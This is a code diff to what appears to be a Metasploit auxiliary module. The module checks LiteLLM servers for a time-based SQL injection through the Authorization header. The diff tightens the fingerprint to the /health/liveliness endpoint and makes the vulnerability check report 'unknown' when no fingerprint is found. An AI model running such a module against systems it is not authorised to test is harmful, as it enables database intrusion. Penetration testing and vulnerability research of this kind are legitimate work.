@@ -77,16 +77,15 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  # Best-effort fingerprint via the unauthenticated /health endpoint.
+  # Fingerprint LiteLLM by its unauthenticated liveliness response.
   def fingerprint
-    res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri('health'))
-    return nil unless res
+    res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri('health', 'liveliness'))
+    return nil unless res&.code == 200 && res.get_json_document == "I'm alive!"
 
-    key = res.headers.keys.find { |k| k.casecmp?('x-litellm-version') }
+    key = res.headers.keys.find { |header| header.casecmp?('x-litellm-version') }
     return "LiteLLM #{res.headers[key]}" if key
-    return 'LiteLLM /health' if res.code == 200
 
-    nil
+    'LiteLLM liveliness probe'
   end
 
   # pg_sleep is evaluated once per matching row, so a populated token table can
@@ -126,8 +125,10 @@ class MetasploitModule < Msf::Auxiliary
 
   def check_host(_ip)
     fp = fingerprint
+    return Exploit::CheckCode::Unknown('LiteLLM fingerprint not detected') unless fp
+
     if create_litellm_sqli.test_vulnerable
-      Exploit::CheckCode::Vulnerable("Time-based SQL injection via Authorization header confirmed#{fp ? " (#{fp})" : ''}")
+      Exploit::CheckCode::Vulnerable("Time-based SQL injection via Authorization header confirmed (#{fp})")
     else
       Exploit::CheckCode::Safe('No time-based SQL injection signal observed')
     end
